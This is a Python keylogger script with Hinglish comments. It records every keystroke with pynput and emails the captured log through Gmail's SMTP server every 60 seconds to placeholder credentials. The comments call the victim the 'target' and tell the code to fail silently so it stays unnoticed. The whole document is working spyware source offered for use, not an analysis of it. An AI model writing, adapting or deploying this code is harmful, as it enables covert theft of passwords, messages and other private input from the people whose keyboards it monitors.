import pynput.keyboard
import smtplib
import threading

# Yahan data jama hoga
log = ""

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        elif key == key.enter:
            log = log + "\n"
        else:
            log = log + " [" + str(key) + "] "

def send_mail(email, password, message):
    # Email bhejne ka logic (Gmail server ke zariye)
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    except Exception as e:
        pass # Agar target ka net band hai toh error mat do, chupchap aage badho

def report():
    global log
    if len(log) > 0:
        # NOTE: Apni testing email aur password yahan dalenge
        send_mail("TUMHARA_EMAIL@gmail.com", "TUMHARA_PASSWORD", log)
        log = "" # Email bhejne ke baad log file khali kar do taaki data repeat na ho
    
    # Har 60 seconds (1 minute) mein ye function loop banayega
    timer = threading.Timer(60, report)
    timer.start()

print("[*] Remote Keylogger Started... Waiting for keystrokes.")

# Keylogger aur Timer dono ek sath background mein start karna
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
